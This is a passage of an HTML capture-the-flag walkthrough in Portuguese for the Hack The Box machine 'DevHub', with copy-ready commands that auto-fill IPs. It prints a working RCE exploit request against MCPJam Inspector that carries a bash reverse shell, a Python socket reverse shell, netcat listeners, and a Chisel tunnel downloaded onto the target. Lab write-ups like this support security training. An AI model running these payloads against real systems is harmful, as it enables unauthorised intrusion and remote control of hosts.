@@ -1,0 +1,1125 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🍔 DevHub – Guia Definitivo com Adaptador de IPs</title>
+    <style>
+        /* ============================================================
+           TEMA KALI + CONFIGURADOR DE IP
+           ============================================================ */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #1a1a2e;
+            color: #d4d4dc;
+            font-family: 'Segoe UI', 'Fira Code', Consolas, monospace;
+            line-height: 1.7;
+            padding: 30px 20px;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: #0d0d1a;
+            padding: 40px 50px;
+            border-radius: 16px;
+            border: 1px solid #2d2d44;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.9), 0 0 80px rgba(75, 0, 130, 0.1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .container::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(ellipse at 30% 20%, rgba(75, 0, 130, 0.06), transparent 60%);
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .container>* {
+            position: relative;
+            z-index: 1;
+        }
+
+        h1 {
+            font-size: 2.8rem;
+            color: #7c6f9e;
+            text-align: center;
+            border-bottom: 3px solid #3d2a5c;
+            padding-bottom: 20px;
+            margin-bottom: 30px;
+            text-shadow: 0 0 30px rgba(124, 111, 158, 0.2);
+        }
+        h1 .highlight { color: #56b45d; }
+
+        h2 {
+            font-size: 2rem;
+            color: #56b45d;
+            margin-top: 50px;
+            margin-bottom: 20px;
+            padding: 10px 20px;
+            border-left: 5px solid #56b45d;
+            background: linear-gradient(90deg, rgba(86, 180, 93, 0.08), transparent);
+            border-radius: 0 8px 8px 0;
+        }
+        h2 .sub { font-size: 1rem; color: #8888aa; font-weight: 400; margin-left: 15px; }
+
+        h3 {
+            font-size: 1.4rem;
+            color: #7c6f9e;
+            margin-top: 35px;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        h3 .badge {
+            background: #2a1a3a;
+            padding: 2px 16px;
+            border-radius: 30px;
+            font-size: 0.7rem;
+            color: #aa99cc;
+            text-transform: uppercase;
+        }
+
+        p {
+            margin-bottom: 18px;
+            font-size: 1.05rem;
+            color: #c8c8d4;
+        }
+        strong { color: #e0e0ee; }
+        code {
+            background: #1a1a2e;
+            padding: 2px 10px;
+            border-radius: 4px;
+            font-size: 0.9rem;
+            color: #7c6f9e;
+            border: 1px solid #2d2d44;
+        }
+
+        .info-box,
+        .warning-box,
+        .success-box {
+            padding: 18px 25px;
+            border-radius: 8px;
+            margin: 20px 0;
+            border: 1px solid #1a1a2e;
+        }
+        .info-box { background: #12121f; border-left: 5px solid #7c6f9e; }
+        .info-box strong { color: #7c6f9e; }
+        .warning-box { background: #1a0e0e; border-left: 5px solid #d43f3f; }
+        .warning-box strong { color: #d43f3f; }
+        .success-box { background: #0e1a0e; border-left: 5px solid #56b45d; }
+        .success-box strong { color: #56b45d; }
+
+        /* ============================================================
+           CONFIGURADOR DE IP
+           ============================================================ */
+        .config-panel {
+            background: #0b0b15;
+            border: 2px solid #2d2d44;
+            border-radius: 12px;
+            padding: 25px 30px;
+            margin: 20px 0 30px 0;
+            box-shadow: 0 0 30px rgba(75, 0, 130, 0.15);
+        }
+        .config-panel h3 {
+            margin-top: 0;
+            color: #56b45d;
+            border-bottom: 1px solid #1a1a2e;
+            padding-bottom: 10px;
+        }
+        .config-row {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 25px;
+            align-items: flex-end;
+        }
+        .config-group {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+            flex: 1 1 250px;
+        }
+        .config-group label {
+            font-size: 0.85rem;
+            font-weight: 600;
+            color: #8888aa;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .config-group input {
+            background: #0d0d1a;
+            border: 1px solid #2d2d44;
+            color: #f0f0f8;
+            padding: 10px 16px;
+            border-radius: 8px;
+            font-family: 'Fira Code', monospace;
+            font-size: 1rem;
+            width: 100%;
+            transition: border-color 0.2s;
+        }
+        .config-group input:focus {
+            outline: none;
+            border-color: #7c6f9e;
+            box-shadow: 0 0 15px rgba(124, 111, 158, 0.2);
+        }
+        .config-group input::placeholder {
+            color: #556688;
+        }
+        .config-apply-btn {
+            background: #2a1a3a;
+            border: 1px solid #7c6f9e;
+            color: #d4d4dc;
+            padding: 10px 30px;
+            border-radius: 8px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.2s;
+            font-size: 1rem;
+            font-family: inherit;
+            height: 44px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .config-apply-btn:hover {
+            background: #3d2a5c;
+            border-color: #9a7acc;
+            color: #fff;
+        }
+        .config-status {
+            color: #56b45d;
+            font-size: 0.9rem;
+            margin-top: 12px;
+            padding: 8px 14px;
+            background: #0e1a0e;
+            border-radius: 6px;
+            border-left: 3px solid #56b45d;
+            display: none;
+        }
+        .config-status.show {
+            display: block;
+        }
+
+        /* ============================================================
+           TERMINAL
+           ============================================================ */
+        .terminal-wrapper {
+            position: relative;
+            margin: 20px 0 25px 0;
+        }
+
+        .terminal {
+            background: #0b0b15;
+            border: 1px solid #2a2a40;
+            border-radius: 10px;
+            padding: 18px 22px;
+            font-family: 'Fira Code', 'Consolas', monospace;
+            font-size: 0.85rem;
+            overflow-x: auto;
+            box-shadow: inset 0 0 40px rgba(0, 0, 0, 0.6), 0 4px 20px rgba(0, 0, 0, 0.4);
+            position: relative;
+            transition: border-color 0.2s;
+        }
+        .terminal:hover { border-color: #3d3a5c; }
+
+        .terminal::before {
+            content: '● ● ●';
+            position: absolute;
+            top: 8px;
+            left: 14px;
+            color: #3a3a5a;
+            font-size: 0.7rem;
+            letter-spacing: 4px;
+            opacity: 0.6;
+        }
+
+        .terminal .cmd-line { display: block; padding: 2px 0; }
+        .terminal .cmd-line .prompt { color: #56b45d; font-weight: 600; }
+        .terminal .cmd-line .command { color: #f0f0f8; }
+
+        .terminal .output-line {
+            display: block;
+            padding: 2px 0 2px 20px;
+            color: #a8a8c0;
+            border-left: 2px solid #2a2a44;
+            margin-left: 8px;
+            margin-top: 4px;
+        }
+        .terminal .output-line .highlight { color: #d4b84c; }
+        .terminal .output-line .error { color: #d43f3f; }
+        .terminal .output-line .success-text { color: #56b45d; }
+        .terminal .output-line .comment { color: #556688; font-style: italic; }
+
+        .copy-btn {
+            position: absolute;
+            top: 10px;
+            right: 14px;
+            background: #1a1a2e;
+            color: #8888aa;
+            border: 1px solid #2d2d44;
+            padding: 4px 14px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 0.7rem;
+            font-family: 'Segoe UI', sans-serif;
+            transition: all 0.2s;
+            z-index: 10;
+            opacity: 0.7;
+        }
+        .copy-btn:hover { background: #2a2a4a; color: #d4d4dc; border-color: #7c6f9e; opacity: 1; }
+        .copy-btn.copied { background: #1a3a1a; color: #56b45d; border-color: #56b45d; }
+
+        /* ============================================================
+           ERROS EXPANSÍVEL
+           ============================================================ */
+        .error-section {
+            margin: 20px 0 30px 0;
+            border: 1px solid #2d2d44;
+            border-radius: 10px;
+            overflow: hidden;
+            background: #0d0d1a;
+        }
+        .error-toggle {
+            width: 100%;
+            background: #1a1a2e;
+            color: #d4b84c;
+            padding: 14px 20px;
+            font-size: 1.05rem;
+            font-weight: 600;
+            border: none;
+            cursor: pointer;
+            text-align: left;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            transition: background 0.2s;
+            font-family: inherit;
+        }
+        .error-toggle:hover { background: #2a1a1a; }
+        .error-toggle .arrow { transition: transform 0.3s; font-size: 1.2rem; }
+        .error-toggle.open .arrow { transform: rotate(90deg); }
+
+        .error-content {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.4s ease, padding 0.3s ease;
+            padding: 0 20px;
+            background: #0b0b15;
+        }
+        .error-content.open {
+            max-height: 2000px;
+            padding: 20px 20px 25px;
+        }
+        .error-item {
+            margin: 15px 0;
+            padding: 15px 18px;
+            background: #12121f;
+            border-left: 4px solid #d43f3f;
+            border-radius: 6px;
+        }
+        .error-item .error-title { color: #d43f3f; font-weight: 700; font-size: 1.05rem; }
+        .error-item .error-solution { color: #56b45d; margin-top: 8px; }
+
+        /* ============================================================
+           GLOSSÁRIO
+           ============================================================ */
+        .term-glossary {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px 30px;
+            margin: 15px 0 25px 0;
+            background: #0d0d1a;
+            padding: 18px 20px;
+            border-radius: 10px;
+            border: 1px solid #1a1a2e;
+        }
+        .term-glossary .term { color: #7c6f9e; font-weight: 700; font-size: 0.95rem; }
+        .term-glossary .def { color: #a8a8c0; font-size: 0.92rem; margin-left: 6px; }
+
+        /* ============================================================
+           OUTROS
+           ============================================================ */
+        .tag {
+            display: inline-block;
+            padding: 2px 14px;
+            border-radius: 30px;
+            font-size: 0.7rem;
+            font-weight: 600;
+            margin-right: 6px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .tag-red { background: #3a1a1a; color: #d43f3f; }
+        .tag-blue { background: #1a1a3a; color: #6a8acf; }
+        .tag-green { background: #1a2a1a; color: #56b45d; }
+        .tag-yellow { background: #2a2a1a; color: #d4b84c; }
+        .tag-purple { background: #2a1a3a; color: #9a7acc; }
+        .tag-orange { background: #3a2a1a; color: #e8a84c; }
+        .tag-gray { background: #1a1a2a; color: #8888aa; }
+
+        .table-wrap { overflow-x: auto; margin: 20px 0; border-radius: 10px; border: 1px solid #1a1a2e; }
+        table { width: 100%; border-collapse: collapse; background: #0d0d1a; }
+        th { background: #1a1a2e; color: #7c6f9e; padding: 12px 18px; text-align: left; border-bottom: 2px solid #2d2d44; }
+        td { padding: 12px 18px; border-bottom: 1px solid #1a1a2e; color: #c8c8d4; }
+        tr:hover { background: #12121f; }
+
+        .card-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin: 25px 0;
+        }
+        .card {
+            background: #0d0d1a;
+            padding: 22px 18px;
+            border-radius: 12px;
+            border: 1px solid #1a1a2e;
+            text-align: center;
+            transition: 0.2s;
+        }
+        .card:hover { border-color: #3d2a5c; background: #12121f; }
+        .card .emoji { font-size: 2.2rem; margin-bottom: 8px; }
+        .card .title { font-weight: 700; color: #7c6f9e; font-size: 1.05rem; }
+        .card .desc { font-size: 0.85rem; color: #8888aa; margin-top: 4px; }
+
+        ul, ol { margin-left: 25px; margin-bottom: 20px; }
+        li { margin-bottom: 8px; color: #c8c8d4; }
+        a { color: #7c6f9e; text-decoration: none; border-bottom: 1px dotted #3d2a5c; }
+        a:hover { color: #56b45d; border-bottom-color: #56b45d; }
+
+        hr { border: 0; height: 1px; background: linear-gradient(90deg, transparent, #2d2d44, transparent); margin: 40px 0; }
+
+        .code-block {
+            background: #0b0b15;
+            padding: 14px 18px;
+            border-radius: 8px;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.82rem;
+            overflow-x: auto;
+            margin: 10px 0;
+            border: 1px solid #1a1a2e;
+            color: #c8c8d4;
+            position: relative;
+        }
+        .code-block .copy-btn { top: 6px; right: 10px; padding: 2px 12px; font-size: 0.65rem; }
+
+        .toc {
+            background: #0d0d1a;
+            border: 1px solid #1a1a2e;
+            border-radius: 10px;
+            padding: 20px 30px;
+            margin: 20px 0 30px 0;
+        }
+        .toc ul {
+            list-style: none;
+            margin-left: 0;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 6px 30px;
+        }
+        .toc li { margin-bottom: 4px; }
+        .toc a { color: #8888aa; font-size: 0.95rem; border-bottom: none; }
+        .toc a:hover { color: #56b45d; }
+
+        .footer {
+            text-align: center;
+            padding: 30px 0 10px 0;
+            color: #556688;
+            border-top: 1px solid #1a1a2e;
+            margin-top: 40px;
+            font-size: 0.9rem;
+        }
+        .footer .kali-logo { color: #56b45d; font-weight: 700; }
+
+        @media (max-width: 768px) {
+            .container { padding: 20px 15px; }
+            h1 { font-size: 2rem; }
+            h2 { font-size: 1.5rem; }
+            .terminal { font-size: 0.7rem; padding: 18px 12px 12px 12px; }
+            .terminal::before { font-size: 0.5rem; top: 5px; left: 10px; }
+            .copy-btn { font-size: 0.6rem; padding: 2px 10px; top: 6px; right: 8px; }
+            .config-row { flex-direction: column; gap: 15px; }
+            .term-glossary { grid-template-columns: 1fr; }
+        }
+
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar-track { background: #0b0b15; }
+        ::-webkit-scrollbar-thumb { background: #2d2d44; border-radius: 10px; }
+        ::-webkit-scrollbar-thumb:hover { background: #3d3a5c; }
+
+        .ip-aware {
+            transition: color 0.1s;
+        }
+        .ip-placeholder {
+            color: #d4b84c;
+            font-weight: 700;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+
+    <!-- ============================================================ -->
+    <!-- HEADER -->
+    <!-- ============================================================ -->
+    <h1>
+        <span style="color: #56b45d;">┌──(</span>kali<span style="color: #56b45d;">㉿</span>kali<span style="color: #56b45d;">)-[~]</span><br>
+        <span style="font-size: 2rem; color: #7c6f9e;">🍔 DevHub <span style="color: #56b45d; font-size: 1.6rem;">|</span> HTB</span>
+        <span style="display: block; font-size: 1rem; color: #556688; margin-top: 5px;">Guia com Adaptador Dinâmico de IPs</span>
+    </h1>
+
+    <!-- ============================================================ -->
+    <!-- CONFIGURADOR DE IP -->
+    <!-- ============================================================ -->
+    <div class="config-panel">
+        <h3>⚙️ Configuração de IPs <span style="font-size:0.8rem; color:#556688; font-weight:400;">(preencha e clique em Aplicar)</span></h3>
+        <div class="config-row">
+            <div class="config-group">
+                <label for="your_ip">🌐 Seu IP (Kali / VPN)</label>
+                <input type="text" id="your_ip" value="10.10.17.190" placeholder="Ex: 10.10.14.15">
+            </div>
+            <div class="config-group">
+                <label for="htb_ip">🎯 IP da Máquina HTB (DevHub)</label>
+                <input type="text" id="htb_ip" value="10.129.91.114" placeholder="Ex: 10.129.1.1">
+            </div>
+            <button class="config-apply-btn" onclick="updateIPs()">🔄 Aplicar</button>
+        </div>
+        <div class="config-status" id="configStatus">✅ Todos os comandos foram atualizados com os novos IPs!</div>
+        <p style="font-size:0.85rem; color:#8888aa; margin-top:12px;">
+            💡 Digite seus IPs e clique em <strong>"Aplicar"</strong>. Todos os comandos do tutorial serão <strong>atualizados automaticamente</strong>!
+            Os placeholders <span class="ip-placeholder">[HTB_IP]</span> e <span class="ip-placeholder">[YOUR_IP]</span> serão substituídos.
+        </p>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- SUMÁRIO -->
+    <!-- ============================================================ -->
+    <div class="toc">
+        <h3 style="margin-top:0; color:#7c6f9e; border:none; padding:0;">📋 Índice</h3>
+        <ul>
+            <li><a href="#preparacao">1. Preparação</a></li>
+            <li><a href="#nmap">2. Enumeração (Nmap)</a></li>
+            <li><a href="#acesso-inicial">3. Acesso Inicial (mcp-dev)</a></li>
+            <li><a href="#tunel">4. Túnel Chisel</a></li>
+            <li><a href="#movimento-lateral">5. Movimento Lateral (analyst)</a></li>
+            <li><a href="#escalacao-root">6. Escalação (root)</a></li>
+            <li><a href="#erros">7. Solução de Erros</a></li>
+            <li><a href="#glossario">8. Glossário de Termos</a></li>
+            <li><a href="#resumo">9. Comandos Rápidos</a></li>
+        </ul>
+    </div>
+
+    <hr>
+
+    <!-- ============================================================ -->
+    <!-- 1. PREPARAÇÃO -->
+    <!-- ============================================================ -->
+    <a name="preparacao"></a>
+    <h2>🛠️ 1. Preparação <span class="sub">pré-requisitos</span></h2>
+
+    <h3>1.1 O que você precisa</h3>
+    <div class="table-wrap">
+        <table>
+            <tr><th>Item</th><th>Descrição</th></tr>
+            <tr><td>Kali Linux</td><td>Sua máquina de ataque (VM ou física)</td></tr>
+            <tr><td>VPN HTB</td><td>Conectado à rede do Hack The Box</td></tr>
+            <tr><td>IP da Máquina</td><td><code>[HTB_IP]</code> (DevHub)</td></tr>
+            <tr><td>Seu IP na VPN</td><td><code>[YOUR_IP]</code> (ex: 10.10.17.190)</td></tr>
+        </table>
+    </div>
+
+    <h3>1.2 Descobrindo seu IP</h3>
+    <p><strong>Por que:</strong> Você precisa do seu IP para receber as conexões da máquina alvo.</p>
+    <div class="terminal-wrapper">
+        <button class="copy-btn" onclick="copyCommand(this)" data-cmd="ip a">📋 copiar</button>
+        <div class="terminal">
+            <span class="cmd-line"><span class="prompt">┌──(kali㉿kali)-[~]</span></span>
+            <span class="cmd-line"><span class="prompt">└─$</span> <span class="command ip-aware" data-raw="ip a">ip a</span></span>
+            <span class="output-line">3: <span class="highlight">tun0</span>: inet <span class="highlight">[YOUR_IP]</span>/23 ...</span>
+        </div>
+    </div>
+    <div class="success-box"><strong>✅ Seu IP:</strong> <code>[YOUR_IP]</code> (substitua em todos os comandos!)</div>
+
+    <h3>1.3 Adicionando o domínio ao /etc/hosts</h3>
+    <p><strong>Por que:</strong> O site redireciona para <code>devhub.htb</code>.</p>
+    <div class="terminal-wrapper">
+        <button class="copy-btn" onclick="copyCommand(this)" data-cmd="echo '[HTB_IP] devhub.htb' | sudo tee -a /etc/hosts">📋 copiar</button>
+        <div class="terminal">
+            <span class="cmd-line"><span class="prompt">└─$</span> <span class="command ip-aware" data-raw="echo '[HTB_IP] devhub.htb' | sudo tee -a /etc/hosts">echo '[HTB_IP] devhub.htb' | sudo tee -a /etc/hosts</span></span>
+            <span class="output-line">[HTB_IP] devhub.htb</span>
+        </div>
+    </div>
+
+    <hr>
+
+    <!-- ============================================================ -->
+    <!-- 2. NMAP -->
+    <!-- ============================================================ -->
+    <a name="nmap"></a>
+    <h2>🔍 2. Enumeração com Nmap</h2>
+
+    <h3>2.1 Varredura rápida</h3>
+    <p><strong>Por que:</strong> Descobrir portas abertas.</p>
+    <div class="terminal-wrapper">
+        <button class="copy-btn" onclick="copyCommand(this)" data-cmd="nmap -p- -T4 --min-rate 1000 --open [HTB_IP]">📋 copiar</button>
+        <div class="terminal">
+            <span class="cmd-line"><span class="prompt">└─$</span> <span class="command ip-aware" data-raw="nmap -p- -T4 --min-rate 1000 --open [HTB_IP]">nmap -p- -T4 --min-rate 1000 --open [HTB_IP]</span></span>
+            <span class="output-line"><span class="highlight">22/tcp   open  ssh</span></span>
+            <span class="output-line"><span class="highlight">80/tcp   open  http</span></span>
+            <span class="output-line"><span class="highlight">6274/tcp open  unknown</span></span>
+        </div>
+    </div>
+
+    <h3>2.2 Varredura detalhada</h3>
+    <div class="terminal-wrapper">
+        <button class="copy-btn" onclick="copyCommand(this)" data-cmd="nmap -sC -sV -p 22,80,6274 [HTB_IP]">📋 copiar</button>
+        <div class="terminal">
+            <span class="cmd-line"><span class="prompt">└─$</span> <span class="command ip-aware" data-raw="nmap -sC -sV -p 22,80,6274 [HTB_IP]">nmap -sC -sV -p 22,80,6274 [HTB_IP]</span></span>
+            <span class="output-line">6274/tcp open  http    <span class="highlight">MCPJam Inspector v1.4.2</span></span>
+        </div>
+    </div>
+    <div class="info-box">🔍 <strong>Descoberta:</strong> O serviço na porta 6274 é o <strong>MCPJam Inspector v1.4.2</strong> – vulnerável!</div>
+
+    <hr>
+
+    <!-- ============================================================ -->
+    <!-- 3. ACESSO INICIAL -->
+    <!-- ============================================================ -->
+    <a name="acesso-inicial"></a>
+    <h2>🚪 3. Acesso Inicial – mcp-dev</h2>
+
+    <h3>3.1 Preparando o ouvinte (Netcat)</h3>
+    <div class="warning-box"><strong>⚠️ Deixe este terminal aberto!</strong></div>
+    <div class="terminal-wrapper">
+        <button class="copy-btn" onclick="copyCommand(this)" data-cmd="nc -lvnp 4444">📋 copiar</button>
+        <div class="terminal">
+            <span class="cmd-line"><span class="prompt">└─$</span> <span class="command ip-aware" data-raw="nc -lvnp 4444">nc -lvnp 4444</span></span>
+            <span class="output-line">listening on [any] 4444 ...</span>
+        </div>
+    </div>
+    <div class="term-glossary">
+        <span><span class="term">nc</span> <span class="def">Netcat – ferramenta de rede</span></span>
+        <span><span class="term">-l</span> <span class="def">listen – escutar</span></span>
+        <span><span class="term">-v</span> <span class="def">verbose – detalhado</span></span>
+        <span><span class="term">-n</span> <span class="def">não resolve nomes DNS</span></span>
+        <span><span class="term">-p 4444</span> <span class="def">porta 4444</span></span>
+    </div>
+
+    <h3>3.2 Enviando o exploit (CVE-2026-23744)</h3>
+    <div class="terminal-wrapper">
+        <button class="copy-btn" onclick="copyCommand(this)" data-cmd="curl -X POST http://[HTB_IP]:6274/api/mcp/connect -H 'Content-Type: application/json' --data '{\"serverConfig\": {\"command\": \"bash\", \"args\": [\"-c\", \"bash -i >& /dev/tcp/[YOUR_IP]/4444 0>&1\"]}, \"serverId\": \"rce\"}'">📋 copiar</button>
+        <div class="terminal">
+            <span class="cmd-line"><span class="prompt">└─$</span> <span class="command ip-aware" data-raw="curl -X POST http://[HTB_IP]:6274/api/mcp/connect -H 'Content-Type: application/json' --data '{\"serverConfig\": {\"command\": \"bash\", \"args\": [\"-c\", \"bash -i >& /dev/tcp/[YOUR_IP]/4444 0>&1\"]}, \"serverId\": \"rce\"}'">curl -X POST http://[HTB_IP]:6274/api/mcp/connect -H 'Content-Type: application/json' --data '{"serverConfig": {"command": "bash", "args": ["-c", "bash -i >& /dev/tcp/[YOUR_IP]/4444 0>&1"]}, "serverId": "rce"}'</span></span>
+        </div>
+    </div>
+    <div class="term-glossary">
+        <span><span class="term">curl</span> <span class="def">cliente HTTP</span></span>
+        <span><span class="term">-X POST</span> <span class="def">método HTTP POST</span></span>
+        <span><span class="term">-H</span> <span class="def">cabeçalho HTTP</span></span>
+        <span><span class="term">--data</span> <span class="def">dados enviados</span></span>
+        <span><span class="term">bash -i</span> <span class="def">shell interativa</span></span>
+    </div>
+
+    <h3>3.3 Conexão estabelecida</h3>
+    <div class="terminal-wrapper">
+        <div class="terminal">
+            <span class="output-line">connect to [[YOUR_IP]] from [HTB_IP] 46898</span>
+            <span class="output-line"><span class="success-text">mcp-dev@devhub:/opt/mcpjam/...</span></span>
+        </div>
+    </div>
+    <div class="success-box"><strong>🎉 Dentro!</strong> Você é <code>mcp-dev</code>.</div>
+
+    <h3>3.4 Estabilizando a shell</h3>
+    <div class="terminal-wrapper">
+        <button class="copy-btn" onclick="copyCommand(this)" data-cmd="python3 -c 'import pty;pty.spawn(\"/bin/bash\")'">📋 copiar</button>
+        <div class="terminal">
+            <span class="cmd-line"><span class="prompt">mcp-dev@devhub:~$</span> <span class="command ip-aware" data-raw="python3 -c 'import pty;pty.spawn(\"/bin/bash\")'">python3 -c 'import pty;pty.spawn("/bin/bash")'</span></span>
+            <span class="cmd-line"><span class="prompt">mcp-dev@devhub:~$</span> <span class="command ip-aware" data-raw="export TERM=xterm">export TERM=xterm</span></span>
+        </div>
+    </div>
+    <p><strong>Ctrl+Z → stty raw -echo; fg</strong> (melhora o uso de setas e Tab).</p>
+
+    <hr>
+
+    <!-- ============================================================ -->
+    <!-- 4. TÚNEL CHISEL -->
+    <!-- ============================================================ -->
+    <a name="tunel"></a>
+    <h2>🌉 4. Túnel Chisel</h2>
+
+    <h3>4.1 Baixar Chisel no Kali</h3>
+    <div class="terminal-wrapper">
+        <button class="copy-btn" onclick="copyCommand(this)" data-cmd="wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz && gunzip chisel_1.9.1_linux_amd64.gz && mv chisel_1.9.1_linux_amd64 chisel && chmod +x chisel">📋 copiar</button>
+        <div class="terminal">
+            <span class="cmd-line"><span class="prompt">└─$</span> <span class="command ip-aware" data-raw="wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz && gunzip chisel_1.9.1_linux_amd64.gz && mv chisel_1.9.1_linux_amd64 chisel && chmod +x chisel">wget ... && gunzip ... && mv ... && chmod +x chisel</span></span>
+        </div>
+    </div>
+
+    <h3>4.2 Servidor Chisel (Terminal 2)</h3>
+    <div class="warning-box"><strong>⚠️ Deixe rodando!</strong></div>
+    <div class="terminal-wrapper">
+        <button class="copy-btn" onclick="copyCommand(this)" data-cmd="./chisel server -v --port 8100 --reverse">📋 copiar</button>
+        <div class="terminal">
+            <span class="cmd-line"><span class="prompt">└─$</span> <span class="command ip-aware" data-raw="./chisel server -v --port 8100 --reverse">./chisel server -v --port 8100 --reverse</span></span>
+            <span class="output-line">2026/08/18 16:21:35 server: Listening on http://0.0.0.0:8100</span>
+        </div>
+    </div>
+
+    <h3>4.3 Servidor HTTP (Terminal 3)</h3>
+    <div class="warning-box"><strong>⚠️ Deixe rodando!</strong></div>
+    <div class="terminal-wrapper">
+        <button class="copy-btn" onclick="copyCommand(this)" data-cmd="python3 -m http.server 8000">📋 copiar</button>
+        <div class="terminal">
+            <span class="cmd-line"><span class="prompt">└─$</span> <span class="command ip-aware" data-raw="python3 -m http.server 8000">python3 -m http.server 8000</span></span>
+            <span class="output-line">Serving HTTP on 0.0.0.0 port 8000 ...</span>
+        </div>
+    </div>
+
+    <h3>4.4 Baixar Chisel na máquina alvo</h3>
+    <div class="terminal-wrapper">
+        <button class="copy-btn" onclick="copyCommand(this)" data-cmd="cd /tmp && curl http://[YOUR_IP]:8000/chisel -o chisel && chmod +x chisel">📋 copiar</button>
+        <div class="terminal">
+            <span class="cmd-line"><span class="prompt">mcp-dev@devhub:/opt/...$</span> <span class="command ip-aware" data-raw="cd /tmp">cd /tmp</span></span>
+            <span class="cmd-line"><span class="prompt">mcp-dev@devhub:/tmp$</span> <span class="command ip-aware" data-raw="curl http://[YOUR_IP]:8000/chisel -o chisel">curl http://[YOUR_IP]:8000/chisel -o chisel</span></span>
+            <span class="output-line">100 8452k ...</span>
+            <span class="cmd-line"><span class="prompt">mcp-dev@devhub:/tmp$</span> <span class="command ip-aware" data-raw="chmod +x chisel">chmod +x chisel</span></span>
+        </div>
+    </div>
+
+    <h3>4.5 Conectar o túnel</h3>
+    <div class="warning-box"><strong>⚠️ Deixe rodando!</strong></div>
+    <div class="terminal-wrapper">
+        <button class="copy-btn" onclick="copyCommand(this)" data-cmd="./chisel client [YOUR_IP]:8100 R:8888:127.0.0.1:8888">📋 copiar</button>
+        <div class="terminal">
+            <span class="cmd-line"><span class="prompt">mcp-dev@devhub:/tmp$</span> <span class="command ip-aware" data-raw="./chisel client [YOUR_IP]:8100 R:8888:127.0.0.1:8888">./chisel client [YOUR_IP]:8100 R:8888:127.0.0.1:8888</span></span>
+            <span class="output-line">Connected (Latency 100.344603ms)</span>
+        </div>
+    </div>
+    <div class="success-box"><strong>✅ Túnel ativo!</strong> Acesse Jupyter em <code>http://127.0.0.1:8888</code>.</div>
+
+    <hr>
+
+    <!-- ============================================================ -->
+    <!-- 5. MOVIMENTO LATERAL -->
+    <!-- ============================================================ -->
+    <a name="movimento-lateral"></a>
+    <h2>👨‍💻 5. Movimento Lateral – analyst</h2>
+
+    <h3>5.1 Descobrir token do Jupyter</h3>
+    <div class="terminal-wrapper">
+        <button class="copy-btn" onclick="copyCommand(this)" data-cmd="ps aux | grep -E 'jupyter|opsmcp'">📋 copiar</button>
+        <div class="terminal">
+            <span class="cmd-line"><span class="prompt">mcp-dev@devhub:/tmp$</span> <span class="command ip-aware" data-raw="ps aux | grep -E 'jupyter|opsmcp'">ps aux | grep -E "jupyter|opsmcp"</span></span>
+            <span class="output-line">analyst ... jupyter-lab --ServerApp.token=<span class="highlight">a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7</span></span>
+        </div>
+    </div>
+
+    <h3>5.2 Acessar Jupyter no navegador</h3>
+    <div class="terminal-wrapper">
+        <div class="terminal"><span class="output-line">http://127.0.0.1:8888/lab?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7</span></div>
+    </div>
+
+    <h3>5.3 Listener para shell analyst</h3>
+    <div class="terminal-wrapper">
+        <button class="copy-btn" onclick="copyCommand(this)" data-cmd="nc -lvnp 4445">📋 copiar</button>
+        <div class="terminal">
+            <span class="cmd-line"><span class="prompt">└─$</span> <span class="command ip-aware" data-raw="nc -lvnp 4445">nc -lvnp 4445</span></span>
+            <span class="output-line">listening on [any] 4445 ...</span>
+        </div>
+    </div>
+
+    <h3>5.4 Código Python no Jupyter</h3>
+    <div class="terminal-wrapper">
+        <button class="copy-btn" onclick="copyCommand(this)" data-cmd="import socket,subprocess,os&#10;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)&#10;s.connect((\&quot;[YOUR_IP]\&quot;,4445))&#10;os.dup2(s.fileno(),0)&#10;os.dup2(s.fileno(),1)&#10;os.dup2(s.fileno(),2)&#10;subprocess.call([\&quot;/bin/bash\&quot;,\&quot;-i\&quot;])">📋 copiar</button>
+        <div class="terminal">
+            <span class="output-line">import socket,subprocess,os</span>
+            <span class="output-line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span>
+            <span class="output-line ip-aware" data-raw="s.connect((\"[YOUR_IP]\",4445))">s.connect(("[YOUR_IP]",4445))</span>
+            <span class="output-line">os.dup2(s.fileno(),0)</span>
+            <span class="output-line">os.dup2(s.fileno(),1)</span>
+            <span class="output-line">os.dup2(s.fileno(),2)</span>
+            <span class="output-line">subprocess.call(["/bin/bash","-i"])</span>
+        </div>
+    </div>
+
+    <h3>5.5 Shell analyst</h3>
+    <div class="terminal-wrapper">
+        <div class="terminal">
+            <span class="output-line">connect to [[YOUR_IP]] ...</span>
+            <span class="output-line"><span class="success-text">analyst@devhub:~$</span></span>
+        </div>
+    </div>
+
